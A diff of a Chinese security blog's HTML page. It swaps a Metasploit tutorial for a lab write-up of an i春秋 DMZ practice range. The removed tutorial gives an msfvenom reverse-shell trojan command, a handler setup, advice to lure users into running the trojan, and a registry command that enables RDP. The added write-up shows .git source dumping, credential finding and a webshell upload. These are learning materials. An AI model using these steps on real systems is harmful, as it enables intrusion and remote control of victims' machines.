@@ -79,22 +79,25 @@
 
 
 
-<meta name="description" content="1.metasploit（MSF）metasploit 综合利用工具 集成上千种漏洞利用方式  操作简单易上手 kali自带 依赖于数据库postgresql 数据库 2.开启MSFKali Linux 64 Bit 2019.1a  Metasploit版本为5.0.2 ​    1./etc/init.d/postgresql start  2.msfconsole  利用MSF生成木马msf">
+<meta name="description" content="访问目标地址 发现没啥可疑的地方，扫描目录发现后台 尝试弱口令登陆，不成功 之前下载的实验工具里有提示有关git的源码下载漏洞 猜测本题和这个漏洞有关AWVS跑一跑 果然存在 于是直接利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali Metasploit 生成简单木马">
-<meta property="og:url" content="http://yoursite.com/2019/04/14/MSF模块/index.html">
+<meta property="og:title" content="i春秋DMZ大型靶场-内网拓展2">
+<meta property="og:url" content="http://yoursite.com/2019/07/17/i春秋DMZ大型靶场-内网拓展2/index.html">
 <meta property="og:site_name" content="= =！">
-<meta property="og:description" content="1.metasploit（MSF）metasploit 综合利用工具 集成上千种漏洞利用方式  操作简单易上手 kali自带 依赖于数据库postgresql 数据库 2.开启MSFKali Linux 64 Bit 2019.1a  Metasploit版本为5.0.2 ​    1./etc/init.d/postgresql start  2.msfconsole  利用MSF生成木马msf">
+<meta property="og:description" content="访问目标地址 发现没啥可疑的地方，扫描目录发现后台 尝试弱口令登陆，不成功 之前下载的实验工具里有提示有关git的源码下载漏洞 猜测本题和这个漏洞有关AWVS跑一跑 果然存在 于是直接利用">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/img/4.png">
-<meta property="og:image" content="http://yoursite.com/img/5.png">
-<meta property="og:image" content="http://yoursite.com/img/6.png">
-<meta property="og:image" content="http://yoursite.com/img/7.png">
-<meta property="og:updated_time" content="2019-07-15T15:36:09.263Z">
+<meta property="og:image" content="http://yoursite.com/img/i春秋大型靶场/21.png">
+<meta property="og:image" content="http://yoursite.com/img/i春秋大型靶场/22.png">
+<meta property="og:image" content="http://yoursite.com/img/i春秋大型靶场/23.png">
+<meta property="og:image" content="http://yoursite.com/source/img/i春秋大型靶场/24.png">
+<meta property="og:image" content="http://yoursite.com/img/i春秋大型靶场/25.png">
+<meta property="og:image" content="http://yoursite.com/img/i春秋大型靶场/26.png">
+<meta property="og:image" content="http://yoursite.com/img/i春秋大型靶场/27.png">
+<meta property="og:updated_time" content="2019-07-17T09:25:51.164Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kali Metasploit 生成简单木马">
-<meta name="twitter:description" content="1.metasploit（MSF）metasploit 综合利用工具 集成上千种漏洞利用方式  操作简单易上手 kali自带 依赖于数据库postgresql 数据库 2.开启MSFKali Linux 64 Bit 2019.1a  Metasploit版本为5.0.2 ​    1./etc/init.d/postgresql start  2.msfconsole  利用MSF生成木马msf">
-<meta name="twitter:image" content="http://yoursite.com/img/4.png">
+<meta name="twitter:title" content="i春秋DMZ大型靶场-内网拓展2">
+<meta name="twitter:description" content="访问目标地址 发现没啥可疑的地方，扫描目录发现后台 尝试弱口令登陆，不成功 之前下载的实验工具里有提示有关git的源码下载漏洞 猜测本题和这个漏洞有关AWVS跑一跑 果然存在 于是直接利用">
+<meta name="twitter:image" content="http://yoursite.com/img/i春秋大型靶场/21.png">
 
 
 
@@ -124,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/14/MSF模块/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/17/i春秋DMZ大型靶场-内网拓展2/">
 
 
 
 
 
-  <title>kali Metasploit 生成简单木马 | = =！</title>
+  <title>i春秋DMZ大型靶场-内网拓展2 | = =！</title>
   
 
 
@@ -237,7 +240,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/14/MSF模块/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/17/i春秋DMZ大型靶场-内网拓展2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="61T">
@@ -254,7 +257,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">kali Metasploit 生成简单木马</h1>
+          <h1 class="post-title" itemprop="name headline">i春秋DMZ大型靶场-内网拓展2</h1>
         
 
         <div class="post-meta">
@@ -266,8 +269,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-14T13:49:49+08:00">
-                2019-04-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-17T13:44:06+08:00">
+                2019-07-17
               </time>
             
 
@@ -304,33 +307,16 @@
       
 
       
-        <h1 id="1-metasploit（MSF）"><a href="#1-metasploit（MSF）" class="headerlink" title="1.metasploit（MSF）"></a><strong>1.metasploit（MSF）</strong></h1><p>metasploit 综合利用工具 集成上千种漏洞利用方式  操作简单易上手</p>
-<p>kali自带 依赖于数据库postgresql 数据库</p>
-<h4 id="2-开启MSF"><a href="#2-开启MSF" class="headerlink" title="2.开启MSF"></a>2.开启MSF</h4><p>Kali Linux 64 Bit <strong>2019.1a</strong>  Metasploit版本为5.0.2</p>
-<p>​    1.<code>/etc/init.d/postgresql start</code></p>
-<p><img src="/img/4.png" alt="4"></p>
-<p>2.<code>msfconsole</code></p>
-<p><img src="/img/5.png" alt="5"></p>
-<h3 id="利用MSF生成木马"><a href="#利用MSF生成木马" class="headerlink" title="利用MSF生成木马"></a>利用MSF生成木马</h3><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.124.145 lport=8787 -f exe &gt;./demo.exe</code></p>
-<p><img src="/img/6.png" alt="6"></p>
-<p>-p 选用什么payload</p>
-<p>lhost 监听ip  kali的ip</p>
-<p>lport 监听端口  </p>
-<p>-f 生成文件类型</p>
-<p>step 1 将生成的木马文件投放到目标机器（Win7）</p>
-<h3 id="加载exp"><a href="#加载exp" class="headerlink" title="加载exp"></a>加载exp</h3><p>use exploit/multi/handler</p>
-<p>加载payload（要和生成木马选用的payload一致）</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>show options查看那些参数是需要输入的</p>
-<p>​    set  lhost 192.168.124.145设置监听的IP</p>
-<p>​    set lport 8787 设置监听的端口</p>
-<p>​    run /exploit 运行</p>
-<p>step 1：诱导用户点击我们的木马程序</p>
-<p>step 2:等待用户上线，就能得到meterpreter        输入 shell 进到被攻击者电脑的终端</p>
-<p><img src="/img/7.png" alt="7"></p>
-<p>step 3：添加用户  开机3389 连接桌面    rdesktop+有木马程序的电脑IP</p>
-<p>开启3389端口的命令 ：<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p>
-
+        <h5 id="访问目标地址-发现没啥可疑的地方，扫描目录发现后台-尝试弱口令登陆，不成功"><a href="#访问目标地址-发现没啥可疑的地方，扫描目录发现后台-尝试弱口令登陆，不成功" class="headerlink" title="访问目标地址 发现没啥可疑的地方，扫描目录发现后台 尝试弱口令登陆，不成功"></a>访问目标地址 发现没啥可疑的地方，扫描目录发现后台 尝试弱口令登陆，不成功</h5><p><img src="/img/i春秋大型靶场/21.png" alt></p>
+<h5 id="之前下载的实验工具里有提示有关git的源码下载漏洞-猜测本题和这个漏洞有关"><a href="#之前下载的实验工具里有提示有关git的源码下载漏洞-猜测本题和这个漏洞有关" class="headerlink" title="之前下载的实验工具里有提示有关git的源码下载漏洞 猜测本题和这个漏洞有关"></a>之前下载的实验工具里有提示有关git的源码下载漏洞 猜测本题和这个漏洞有关</h5><h5 id="AWVS跑一跑-果然存在-于是直接利用"><a href="#AWVS跑一跑-果然存在-于是直接利用" class="headerlink" title="AWVS跑一跑 果然存在 于是直接利用"></a>AWVS跑一跑 果然存在 于是直接利用</h5><a id="more"></a>
+<p><code>python githack.py http://172.16.12.206/.git</code></p>
+<p><img src="/img/i春秋大型靶场/22.png" alt></p>
+<p><img src="/img/i春秋大型靶场/23.png" alt></p>
+<h5 id="把源码下载下来后进行代码审计-发现在db-php-和photoblog-sql分别发现了数据库和后台的账号密码"><a href="#把源码下载下来后进行代码审计-发现在db-php-和photoblog-sql分别发现了数据库和后台的账号密码" class="headerlink" title="把源码下载下来后进行代码审计 发现在db.php 和photoblog.sql分别发现了数据库和后台的账号密码"></a>把源码下载下来后进行代码审计 发现在db.php 和photoblog.sql分别发现了数据库和后台的账号密码</h5><p><img src="/source/img/i春秋大型靶场/24.png" alt></p>
+<h5 id="登陆后台后发现有上传图片的地方"><a href="#登陆后台后发现有上传图片的地方" class="headerlink" title="登陆后台后发现有上传图片的地方"></a>登陆后台后发现有上传图片的地方</h5><p><img src="/img/i春秋大型靶场/25.png" alt></p>
+<h5 id="尝试上传一句话-但是上传后访问不到-继续审计源码后发现他把所有上传的图片后面加了-png"><a href="#尝试上传一句话-但是上传后访问不到-继续审计源码后发现他把所有上传的图片后面加了-png" class="headerlink" title="尝试上传一句话 但是上传后访问不到 继续审计源码后发现他把所有上传的图片后面加了.png"></a>尝试上传一句话 但是上传后访问不到 继续审计源码后发现他把所有上传的图片后面加了.png</h5><h5 id="于是访问1-php-png-成功"><a href="#于是访问1-php-png-成功" class="headerlink" title="于是访问1.php.png 成功"></a>于是访问1.php.png 成功</h5><p><img src="/img/i春秋大型靶场/26.png" alt></p>
+<h5 id="上菜刀连接"><a href="#上菜刀连接" class="headerlink" title="上菜刀连接"></a>上菜刀连接</h5><p><img src="/img/i春秋大型靶场/27.png" alt></p>
+<h5 id="暂时没提权成功，等待后续操作"><a href="#暂时没提权成功，等待后续操作" class="headerlink" title="暂时没提权成功，等待后续操作"></a>暂时没提权成功，等待后续操作</h5>
       
     </div>
     
@@ -354,8 +340,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/14/搭建博客/" rel="next" title="如何利用GITHUB+Hexo搭建个人博客">
-                <i class="fa fa-chevron-left"></i> 如何利用GITHUB+Hexo搭建个人博客
+              <a href="/2019/07/15/i春秋DMZ大型靶场-内网拓展/" rel="next" title="i春秋DMZ大型靶场(内网拓展)">
+                <i class="fa fa-chevron-left"></i> i春秋DMZ大型靶场(内网拓展)
               </a>
             
           </div>
@@ -363,10 +349,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/15/winRAR目录穿越漏洞/" rel="prev" title="winRAR目录穿越漏洞">
-                winRAR目录穿越漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -480,7 +462,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-metasploit（MSF）"><span class="nav-number">1.</span> <span class="nav-text">1.metasploit（MSF）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-开启MSF"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">2.开启MSF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用MSF生成木马"><span class="nav-number">1.0.1.</span> <span class="nav-text">利用MSF生成木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加载exp"><span class="nav-number">1.0.2.</span> <span class="nav-text">加载exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#访问目标地址-发现没啥可疑的地方，扫描目录发现后台-尝试弱口令登陆，不成功"><span class="nav-number">1.</span> <span class="nav-text">访问目标地址 发现没啥可疑的地方，扫描目录发现后台 尝试弱口令登陆，不成功</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#之前下载的实验工具里有提示有关git的源码下载漏洞-猜测本题和这个漏洞有关"><span class="nav-number">2.</span> <span class="nav-text">之前下载的实验工具里有提示有关git的源码下载漏洞 猜测本题和这个漏洞有关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#AWVS跑一跑-果然存在-于是直接利用"><span class="nav-number">3.</span> <span class="nav-text">AWVS跑一跑 果然存在 于是直接利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#把源码下载下来后进行代码审计-发现在db-php-和photoblog-sql分别发现了数据库和后台的账号密码"><span class="nav-number">4.</span> <span class="nav-text">把源码下载下来后进行代码审计 发现在db.php 和photoblog.sql分别发现了数据库和后台的账号密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#登陆后台后发现有上传图片的地方"><span class="nav-number">5.</span> <span class="nav-text">登陆后台后发现有上传图片的地方</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#尝试上传一句话-但是上传后访问不到-继续审计源码后发现他把所有上传的图片后面加了-png"><span class="nav-number">6.</span> <span class="nav-text">尝试上传一句话 但是上传后访问不到 继续审计源码后发现他把所有上传的图片后面加了.png</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#于是访问1-php-png-成功"><span class="nav-number">7.</span> <span class="nav-text">于是访问1.php.png 成功</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上菜刀连接"><span class="nav-number">8.</span> <span class="nav-text">上菜刀连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#暂时没提权成功，等待后续操作"><span class="nav-number">9.</span> <span class="nav-text">暂时没提权成功，等待后续操作</span></a></li></ol></div>
             
 
           </div>
